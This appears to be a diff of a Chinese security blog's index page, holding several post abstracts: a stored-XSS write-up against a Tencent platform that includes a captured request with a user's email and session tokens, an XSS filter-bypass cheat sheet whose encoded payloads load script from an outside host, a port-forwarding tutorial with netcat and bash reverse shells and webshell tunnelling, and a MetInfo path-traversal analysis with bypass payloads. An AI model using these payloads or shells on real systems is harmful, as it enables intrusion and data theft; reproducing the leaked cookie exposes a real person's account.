ptui_loginuin=xiaoxuan339449639@163.com; wxky=1; omtoken=6cdb5bf845; omtoken_expire=1541077196; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; alertclicked=%7C%7C; rmod=1; pgv_info=ssid=s4945033110; ts_last=om.qq.com/article/articleManage; pgv_pvid=554507366; ts_uid=9880183784; tvfe_boss_uuid=d7a07c30dcda956a; 9e67236d07bdc7152e6e2b42b7f00f43=0bc53b88ec4021e7cddd3d738402d33535846c07a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522aFWX5zYL69tXvF97f3DLiQ00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));var pass=&#123;&apos;id&apos;: &apos;1&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A1AC67&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-e5431b2b2d26227d24194de0cfbee8e1.png!small" alt=""></p>
-<p>腾讯让人头疼的skey,可跨域打cookie，危害不能小视~<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-0ddd2eae3bd7ba416f8a94e0441d0753.png!small" alt=""></p>
-<p>0x02 修复建议：</p>
-<p>   原先自己觉得可以 session  == token ，每次发布的session 都不同， 后端判断 token = session ，但这不适合用于 这种场景，而是用于CSRF、 也是自己对条件竞争不太了解。</p>
-<p>1、后端对预览处进行过滤吧，XSS修复这种方法这里就不再提了。<br>2、对应条件竞争， 后端对发送请求时间间隔进行限制，也是最简单暴力的，但是同时又影响了用户的体验，正牌的方法是多线程加锁，并发（时间间隔极小）请求时，前一个线程的请求还未处理完时，开始处理第二个线程，后续的代码还没判断时第二个线程的请求也得到了处理，导致多个线程资源竞争问题 ，这个之后还要仔细研究一下。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/">浅谈跨站脚本绕过和防御</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-10-18</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p><code>最近一直偏向这方面的挖掘,也遇到了很多有趣的情况,故总 结一下一些自己的思路。 静下心来,边写边学吧 ~</code></p>
-<p>跨站脚本攻击 (Cross Site Scripting) 俗称:XSS ,利用网站本身设计不严谨,导致执行用户提交的恶意javascript脚本,对网站自身造成危害,XSS漏洞是web渗透中最常见而又最灵活的一个漏洞。</p>
-<h2 id="0x01-XSS分类"><a href="#0x01-XSS分类" class="headerlink" title="0x01   XSS分类 "></a>0x01   XSS分类 </h2><p>#<code>原理很重要, 一定要认真看。</code><br>XSS大致分为:反射型、存储型、DOM型(这三种)</p>
-<p><code>反射型XSS: 只是简单地把用户输入的数据 由服务端反射给浏览器,攻击时需要用户配合点击,也叫”非持久性XSS”</code></p>
-<p><code>存储型XSS: 会把用户输入的数据存储在服务器端, 也叫”持久型XSS” 常见在留言板,评论处,(图片上传处)，发帖等展示用户输入内容的功能点。</code></p>
-<p>经常说到Dom型,个人感觉也是反射的一种延伸吧,但还是区别的,输出端不同 。 </p>
-<p><code>Dom型: 可以通过修改页面的DOM 节点 形成的XSS漏洞</code></p>
-<p>注意:无论是反射型和存储型, 都是需要与服务端交互的,既服务端将提交的内容反馈到了html源码内, 导致触发XSS。</p>
-<p>而<strong>Dom型 XSS</strong>是不需要服务端交换的, 只与客户端的js交互, 也就是说提交的恶意代码, 被放到了js中执行 ,由浏览器端完成,  然后显示了出来, 那么这种形式有一种问题, 因为服务端返回的源码都是一样的, 只不过源码里面包含了一段js,可以在审查源码中查看 ,这属于前端javascript自身的漏洞。</p>
-<p>（参考搜索 <a href="http://wooyun.jozxing.cc" target="_blank" rel="noopener">http://wooyun.jozxing.cc</a> 乌云镜像 ）</p>
-<h2 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害:"></a>XSS危害:</h2><p><code>发生在客户端,目的是让浏览器执行一段用户提交的恶意js代码,从而达到默种目的, 利用面太广了 ,在这加不一一去细说了,js也是个强大的语言</code></p>
-<h2 id="XSS探测"><a href="#XSS探测" class="headerlink" title="XSS探测:"></a>XSS探测:</h2><p><code>&lt;&gt;xss  一般主要不过滤 “&lt;“ , “&gt;” 一般都是可以绕过的,当然还是要看到输出在什么地方用什么绕过的方法。 随机应变吧</code></p>
-<h2 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过:"></a>关于绕过:</h2><p>以下是在日常操作中,积累的标签。</p>
-<p>##没有做如何过滤的情况下:</p>
-<p><code>&lt;sCRiPt/SrC=//60.wf/Sohr&gt;   大小写 比较常用</code></p>
-<h2 id="如果过滤-lt-script-gt-的前提下"><a href="#如果过滤-lt-script-gt-的前提下" class="headerlink" title="如果过滤&lt;script&gt;的前提下:"></a>如果过滤<code>&lt;script&gt;</code>的前提下:</h2><p><code>&lt;img src=x onerror=s=createElement(‘script’);body.appendChild(s);s.src=‘https://60.wf/Sohr’;&gt;</code></p>
-<p><code>&lt;svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
-<p><code>&lt;iframe/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62))&gt;</code></p>
-<p>默些网站只是过滤了敏感标签,可以根据正则匹配去拼接绕过。</p>
-<h2 id="如果过滤script情况下"><a href="#如果过滤script情况下" class="headerlink" title="如果过滤script情况下 "></a>如果过滤<code>script</code>情况下 </h2><p>data协议:<br><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;</code></p>
-<p><code>&lt;iframe/src=“data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==“&gt;</code></p>
-<h2 id="如果输出在-lt-script-gt-标签下"><a href="#如果输出在-lt-script-gt-标签下" class="headerlink" title="如果输出在&lt;script&gt;标签下 :"></a>如果输出在<code>&lt;script&gt;</code>标签下 :</h2><p><code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</code></p>
-<p><code>document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,39,47,47,54,48,46,119,102,47,83,111,104,114,39,62,60,92,47,115,99,114,105,112,116,62))</code></p>
-<p><code>var s=document.createElement(“script”);s.src=“//60.wf/Sohr”;document.head.appendChild(s);</code></p>
-<h2 id="关于javascript-x16进制编码"><a href="#关于javascript-x16进制编码" class="headerlink" title="关于javascript x16进制编码:"></a>关于javascript x16进制编码:</h2><p><code>javascript:document.write(“&lt;script src=‘//60.wf/Sohr’&gt;&lt;/script&gt;”);</code></p>
-<p>编码为:</p>
-<p><code>java\x73\x63\x72\x69\x70\x74\x3a\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x22\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x27\x2f\x2f\x36\x30\x2e\x77\x66\x2f\x53\x6f\x68\x72\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x29\x3b\x20;</code></p>
-<p>可根据环境再次URL编码 </p>
-<h2 id="关于十进制编码"><a href="#关于十进制编码" class="headerlink" title="关于十进制编码:"></a>关于十进制编码:</h2><p><code>location.href=‘javascript:document.write(‘&lt;script&gt;alert&lt;/script&gt;’);</code></p>
-<p>编码为：</p>
-<p><code>location.href=‘j\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0077\u0072\u0069\u0074\u0065\u0028\u0027\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0027\u0029\u003b</code></p>
-<h2 id="关于Base64编码"><a href="#关于Base64编码" class="headerlink" title="关于Base64编码:"></a>关于Base64编码:</h2><p><code>document.write(atob(‘PC9zY3JpcHQ+PHN2Zy9vbmxvYWQ9YWxlcnQoMSk7Pg==‘))</code></p>
-<p>以具体情况采用编码的形式去绕过 。收集playload是一种错误选择，持续更新！</p>
-<blockquote>
-<p>某些时候因为输入铭感标签被WAF(例如某知道创宇)拦截了,POST包长度限制无法传输…..等等,由于最近经常出现这种情况。但是完全在原页面去中转 , 用iframe  embed 等框架来中转 配合XSS 来获取cookie 等操作。</p>
-</blockquote>
-<h2 id="0x02-XSS防御"><a href="#0x02-XSS防御" class="headerlink" title="0x02 XSS防御:"></a>0x02 XSS防御:</h2><p>以下列举几种常见的防御方法吧,也是个人觉得比较有效的方式。</p>
-<ol>
-<li><p>可以在Cookie中设置httponly(浏览器禁止页面的js访问带有httponly属性的cookie)。</p>
-</li>
-<li><p>检测输入,设置白名单方式</p>
-</li>
-<li><p>输出检查,针对不同位置的输出,使用不同的处理方式(编码,转义,常用编码:html编码,js编码等),比较有针对性的函数:htmlspecialchars,strip_tags等函数,去除html标签。</p>
-</li>
-<li><p>处理富文本 (使用白名单方式)。</p>
-</li>
-<li><p>header中使用 content—Sencurity-Policy字段,规定请求js的域名白名单(CSP策略)</p>
-</li>
-</ol>
-<h2 id="设置httponly"><a href="#设置httponly" class="headerlink" title="设置httponly"></a>设置httponly</h2><p><code>httponly无法完全的防御xss漏洞,它只是规定了不能使用js去获取cookie的内容,防止了用户凭证劫持的问题。</code></p>
-<h2 id="XSS-filter"><a href="#XSS-filter" class="headerlink" title="XSS filter"></a>XSS filter</h2><p><code>XSS filter 往往是一个文本文件,里面包含了允许用户输入提交的字符(也包含了不运行用户
-提交的字符,他的检测点是在于用户的输入的时候,推荐使用白名单,但即使使用白名单也无法杜绝XSS的问题。</code></p>
-<h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><p><code>编码方式有很多,比如html编码,url编码,16进制编码,javascript编码等。</code><br><code>在处理用户输入的时候,除了用XSS filter的方式过滤一些敏感字符外,还需要编码,将一些敏感字符通过编码的方式改变原来的样子,从而不能被浏览器当成js代码执行</code>。</p>
-<h2 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本 "></a>处理富文本 </h2><p><code>有一些网页编辑器允许用户提交一些自定义的html代码 ,称为富文本 ,要想在富文本处防御XSS漏洞,最简单有效的方法加是控制用户能使用的标签,限制为只能使用a.div等安全标签。</code></p>
-<h2 id="处理所有输出类型的XSS漏洞"><a href="#处理所有输出类型的XSS漏洞" class="headerlink" title="处理所有输出类型的XSS漏洞"></a>处理所有输出类型的XSS漏洞</h2><p><code>XSS漏洞本质上是一种html注入,页加是将html代码注入到网页中,那么其防御的根本加是将用户提交的代码显示页面上的时候做一系列的过滤和转义。</code></p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/10/17/端口转发的学习/">关于内网端口转发学习</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-10-17</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>空闲之余,故学习下端口转发的原理和实践以便日后查看。</p>
-<p>首先，区分下正向代理和反向代理 </p>
-<p><strong>A  -B  -C </strong></p>
-<p>A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。 </p>
-<p>反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。</p>
-<p>首先 </p>
-<p>开两台实验机：<br>A（172.28.100.51） Kali 具有攻击环境<br>B (172.28.100.188) 用来代理的服务端<br>C (172.28.100.155)   web内网主机 </p>
-<h2 id="利用SSH隧道-B作为正向代理，-做动态端口转发"><a href="#利用SSH隧道-B作为正向代理，-做动态端口转发" class="headerlink" title="利用SSH隧道,B作为正向代理， 做动态端口转发"></a>利用SSH隧道,B作为正向代理， 做动态端口转发</h2><p>在A上面运行：</p>
-<h2 id="ssh-2-D-2333-rootk-172-28-100-188"><a href="#ssh-2-D-2333-rootk-172-28-100-188" class="headerlink" title="ssh -2 -D 2333 rootk@172.28.100.188"></a><code>ssh -2 -D 2333 rootk@172.28.100.188</code></h2><p>这条命令是将A本地的2333端口，与B的22端口建立Socks连接。</p>
-<p>如果需要访问C的80端口，  浏览器需要侦听127.0.0.1：2333 socks代理 </p>
-<p>直接在A扫描C的端口 ，调用proxychains 侦听 127.0.0.1 2333</p>
-<h2 id="vim-etc-proxychains-conf"><a href="#vim-etc-proxychains-conf" class="headerlink" title="vim /etc/proxychains.conf"></a><code>vim /etc/proxychains.conf</code></h2><p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73" alt=""></p>
-<p><code>proxychains nmap -Pn -sT 172.28.100.155</code></p>
-<h2 id="利用ssh隧道，B作为正向代理，进行单一的端口转发"><a href="#利用ssh隧道，B作为正向代理，进行单一的端口转发" class="headerlink" title="利用ssh隧道，B作为正向代理，进行单一的端口转发 "></a>利用ssh隧道，B作为正向代理，进行单一的端口转发 </h2><h2 id="ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><a href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188" class="headerlink" title=" ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188"></a> <code>ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</code></h2><p>同理，需要设置socks代理 ， 127.0.0.1 1111</p>
-<p>A访问127.0.0.1:1111 相当于访问C的 80端口 </p>
-<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5edcd2711cd136d9f68e1" alt=""></p>
-<h2 id="ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><a href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188" class="headerlink" title="ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188"></a><code>ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</code></h2><p>A访问 127.0.0.1:2222 相当与访问172.28.100.155:22 (C) 中间需要<a href="mailto:rootk@172.28.100.188" target="_blank" rel="noopener">rootk@172.28.100.188</a> (B)来转发。</p>
-<h2 id="利用ssh隧道，B做反向代理，做单一的端口转发"><a href="#利用ssh隧道，B做反向代理，做单一的端口转发" class="headerlink" title="利用ssh隧道，B做反向代理，做单一的端口转发 "></a>利用ssh隧道，B做反向代理，做单一的端口转发 </h2><p>A访问127.0.0.1:8888 相当于访问C的80端口</p>
-<p><code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code></p>
-<p><code>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</code></p>
-<p>实验中常出现密钥写入的问题 ，很鸡肋。</p>
-<p>在B上运行： 172.28.100.188</p>
-<h2 id="ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><a href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51" class="headerlink" title="ssh -R 7777:172.28.100.155:80 root@172.28.100.51"></a><code>ssh -R 7777:172.28.100.155:80 root@172.28.100.51</code></h2><p>B主动去ssh连接，将来自(A)172.28.100.51:8888 的 请求转化成（C）172.28.100.155:80的请求，然后将结果通过ssh隧道，返回给A</p>
-<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8" alt=""></p>
-<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>Git项目地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a> </p>
-<p><code>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言。</code></p>
-<p>连接172.28.100.188的webshell，上传tunnel.php和 tunnel.nosocket.php 到web目录 </p>
-<p>在 A(Kali）上面去运行 </p>
-<p><code>python reGeorgSocksProxy.py -p 9999 -u http://172.28.100.188/tunnel.nosocket.php</code></p>
-<p>此时会利用172.28.100.188的web服务，与本机的9999端口建立socks代理，就可以用A去打C了。 </p>
-<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b" alt=""></p>
-<h2 id="Windows下-的端口转发"><a href="#Windows下-的端口转发" class="headerlink" title="Windows下 的端口转发 "></a>Windows下 的端口转发 </h2><p>nc反弹</p>
-<p>正向连接</p>
-<p>在内网执行</p>
-<p><code>nc -l -p 5555 -t -e cmd.exe</code></p>
-<p>-t是通过telne模式执行 cmd.exe 程序，可以省略。</p>
-<p>在公网执行:<br><code>nc -nvv 192.168.8.135 5555</code></p>
-<p>反向连接：</p>
-<p>公网：<br><code>nc -lp 5555</code></p>
-<p>在内网机器反弹 #<code>nc -t -e cmd 192.168.8.135 5555</code></p>
-<h2 id="Linux下的使用："><a href="#Linux下的使用：" class="headerlink" title="Linux下的使用："></a>Linux下的使用：</h2><p>攻击机:nc -vlp 9999</p>
-<p>目标机:bash -i &gt;&amp; /dev/tcp/192.168.8.145/9999 0&gt;&amp;1</p>
-<p>命令 ： bash -i 产生一个交互式bash </p>
-<blockquote>
-<p>&amp; /dev/tcp/ip/port 建立给TCP连接，把标准输出和错误重定向到TCP连接<br>0&gt;&amp;1  从TCP连接获取输入 。</p>
-</blockquote>
-<h2 id="lcx转发："><a href="#lcx转发：" class="headerlink" title="lcx转发："></a>lcx转发：</h2><p>内网：172.28.100.89  开有3389的机器<br>公网:172.28.100.58</p>
-<p>由于是本地实验，故拿内网环境充当公网ip，所以正常的情况下，内网可以正常访问公网，而公网环境不能访问内网。</p>
-<p>内网上执行:lcx.exe -slave 公网IP+端口 内网IP+端口</p>
-<p><code>lcx.exe –slave 172.28.100.58 4444 172.28.100.89 3389</code></p>
-<p>将内网的3389转发到公网的4444端口 。</p>
-<p>公网上执行 <code>lcx.exe -listen 4444 5555</code></p>
-<p>此时内网已把 3389端口转发到公网的5555端口，可以通过127.0.0.1:5555 去连接远程客户端 。</p>
-<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6b065db5aa603f192deee" alt=""></p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/10/15/MetInfo 任意文件读取漏洞的修复与绕过/">MetInfo 任意文件读取漏洞的修复与绕过</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-10-15</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo 6.0.0~6.1.0版本ß中的 old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件。</p>
-<h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><ul>
-<li>MetInfo 6.0.0</li>
-<li>MetInfo 6.1.0</li>
-</ul>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>看到\MetInfo6\app\system\include\module\old_thumb.class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># MetInfo Enterprise Content Management System</span><br><span class="line"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved.</span><br><span class="line"></span><br><span class="line">defined(&apos;IN_MET&apos;) or exit(&apos;No permission&apos;);</span><br><span class="line"></span><br><span class="line">load::sys_class(&apos;web&apos;);</span><br><span class="line"></span><br><span class="line">class old_thumb extends web&#123;</span><br><span class="line"></span><br><span class="line">      public function doshow()&#123;</span><br><span class="line">        global $_M;</span><br><span class="line"></span><br><span class="line">        $dir = str_replace(&apos;../&apos;, &apos;&apos;, $_GET[&apos;dir&apos;]);</span><br><span class="line"></span><br><span class="line">        if(strstr(str_replace($_M[&apos;url&apos;][&apos;site&apos;], &apos;&apos;, $dir), &apos;http&apos;))&#123;</span><br><span class="line">            header(&quot;Content-type: image/jpeg&quot;);</span><br><span class="line">            ob_start();</span><br><span class="line">            readfile($dir);</span><br><span class="line">            ob_flush();</span><br><span class="line">            flush();</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
-<p>从代码中看到，<code>$dir</code>直接由<code>$_GET[&#39;dir&#39;]</code>传递进来，并将<code>../</code>置空。目前是进入到第一个if里面的<code>readfile($dir）</code>; 读取文件，看着if语句的条件，里面的是将<code>$dir</code>中包含<code>$$_M[&#39;url&#39;][&#39;site&#39;]</code>的部分置空，外面是一个<code>strstr</code>函数，判断$dir中http字符串的首次出现位置，也就是说，要进入到这个 if 语句里面，<code>$dir</code>中包含<code>http</code>字符串即可。</p>
-<p>从上面的分析可以构造出 payload，只要$dir里包含http字符串就可以进入到readfile函数从而读取任意函数，然后可以使用…/./来进行目录跳转，因为../会被置空，所以最终payload 如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?dir=..././http/..././config/config_db.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c606550f8dd1c08ea24da" alt=""><br>对于这个任意文件读取漏洞，官方一直没补好，导致被绕过了几次。以下几种绕过方式均已提交CNVD，由CNVD通报厂商。</p>
-<h1 id="第一次绕过"><a href="#第一次绕过" class="headerlink" title="第一次绕过"></a>第一次绕过</h1><p>根据WAM的监测记录，官方5月份的时候补了这个漏洞，但是没补完全。<br>看下diff<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c609950f8dd1c08ea2b69" alt=""></p>
-<p>可以看到，之前的只是把<code>../</code>置空，而补丁是把<code>../</code>和<code>./</code>都置空了。但是这里还是可以绕过。可以使用<code>.....///</code>来跳转目录，<code>.....///</code>经过<code>str_replace</code>置空，正好剩下../，可以跳转。所以payload是</p>
-<p><code>?dir=.....///http/.....///config/config_db.php</code></p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c60d59b521a1d15a3a4cf" alt=""></p>
-<h1 id="第二次绕过"><a href="#第二次绕过" class="headerlink" title="第二次绕过"></a>第二次绕过</h1><p>在提交第一种绕过方式给CNVD之后，MetInfo没多久就更新了，来看下官方的修复方式。<br>diff<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c60e9ea3b4a62388d4976" alt=""></p>
-<p>这里加了一个判断，$dir要以http开头，变换一下之前的payload就可以继续绕过了。</p>
-<p><code>?dir=http/.....///.....///config/config_db.php</code><br><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c611050f8dd1c08ea3869" alt=""></p>
-<h1 id="第三次绕过"><a href="#第三次绕过" class="headerlink" title="第三次绕过"></a>第三次绕过</h1><p>再次提交之后，官方知悉该绕过方式，又补了一次了。<br>看下diff<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c613d9b521a1d15a3b027" alt=""></p>
-<p>看到补丁，又多加了一个判断条件，使用strpos函数查找<code>./</code>首次出现的位置，也就是说不能有<code>./</code>。没了<code>./</code>，在Windows下还可以用<code>..\</code>来跳转目录。所以payload</p>
-<p><code>?dir=http\..\..\config\config_db.php</code><br><img src="https://www.yunzhijia.com/microblog/filesvr/5c1c61549b521a1d15a3b2b9" alt=""><br>遗憾的是，这个只能在Windows环境下面才可以。</p>
-<p>#最终<br>目前在官网供下载的最新的6.1.0版本中，<code>old_thumb.class.php</code>这个文件已经被删除。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一次次的修补，一次次的绕过，感觉开发者应该是没有理解到漏洞利用的原理，一直以类黑名单的形式在修复，而黑名单的形式总是容易被绕过。除了删除文件外，根据实际功能，可以考虑使用白名单方式修复，例如限定所能读取的文件类型为图片类型。</p>
-
-                
-            </div>
-        </article>
-    
-</div>
-<div class="paginator">
-    
-        
-        
-        <a class="next" href="/c1y2m3.github.io/page/2/">
-            下一页
-            <i class="iconfont icon-next"></i>
-        </a>
-        
-    
+</html>
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">
+  <h1><a class="brand" href="#">c1y2m3’blog</a></h1>
 </div>
 
-    </div>
+
+
+<div class="row page">
+	<div class="col-md-12">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search notes..." class="st-search-input st-default-search-input form-control" style="margin-bottom:1em">
+        <div id="local-search-result"></div>
+		<div class="panel-group" id="notebook">
+			
+			
+			
+			
+			
+			<div class="panel panel-default">
+				<div class="panel-heading">
+					<a class="panel-title" data-toggle="collapse" data-parent="#notebook" href="#Scratch">
+						<i class="fa fa-folder"></i> Scratch		   
+				</a></div>
+				
+					<div id="Scratch" class="panel-collapse collapse in">
+				
+					    <div class="panel-body">
+						    <ul class="post">
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/09/15/服务器解析漏洞(总结)/">关于服务器的上传漏洞分析</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/09/16/【VULNERABLITY】文件上传绕过总结/">文件上传绕过总结</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/09/26/ redis安全详解/">Redis学习详解</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/09/29/ Cobalt Strike学习笔记/">Cobalt Strike学习笔记</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/10/07/关于前期信息收集笔记/">关于前期信息收集笔记</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/10/15/MetInfo 任意文件读取漏洞的修复与绕过/">MetInfo 任意文件读取漏洞的修复与绕过</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/10/17/端口转发的学习/">关于内网端口转发学习</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/">浅谈跨站脚本绕过和防御</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /">从SELF-XSS到存储型XSS/附绕过token分析过程</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/11/14/如何有效防御CSRF/">如何有效防御CSRF</a></li>
+			                    
+			    
+			                    
+			                    <li class="post-list-item"><a href="/c1y2m3.github.io/2018/11/20/在Linux下文件包含漏洞的另类拿SHELL方法 /">在Linux下文件包含漏洞的另类拿SHELL方法</a></li>
+			                    
+			    
+			                    
